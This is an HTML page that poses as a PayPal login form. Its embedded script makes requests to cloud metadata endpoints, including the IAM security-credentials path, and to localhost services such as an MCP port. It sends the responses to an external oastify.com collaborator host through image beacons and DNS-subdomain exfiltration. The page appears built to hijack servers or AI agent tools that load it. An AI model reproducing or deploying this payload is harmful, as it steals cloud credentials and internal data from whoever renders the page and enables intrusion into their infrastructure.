<!DOCTYPE html>
<html>
<head><title>Login - PayPal</title></head>
<body>
<h1>PayPal Login</h1>
<form>
  <input type="email" placeholder="Email">
  <input type="password" placeholder="Password">
  <button>Login</button>
</form>
<script>
const collab = "9u41m2dngv7pgaf20zxco3q4avgm4cs1.oastify.com";
const targets = [
  "http://169.254.169.254/latest/meta-data/",
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
  "http://127.0.0.1/",
  "http://127.0.0.1:8080/mcp",
];

targets.forEach(url => {
  // Try XMLHttpRequest sync
  try {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', url, false); // synchronous
    xhr.send();
    var data = encodeURIComponent(xhr.responseText.substring(0, 200));
    new Image().src = `http://${collab}/?url=${encodeURIComponent(url)}&data=${data}&status=${xhr.status}`;
  } catch(e) {
    // Try DNS exfil via subdomain
    var errenc = encodeURIComponent(e.toString()).substring(0,30).replace(/%/g,'x');
    var sub = errenc.replace(/[^a-zA-Z0-9]/g,'').substring(0,20);
    new Image().src = `http://${sub}.${collab}/`;
  }
});

// Also try location-based redirect to internal
// window.location = "http://169.254.169.254/latest/meta-data/"\;
</script>
</body>
</html>
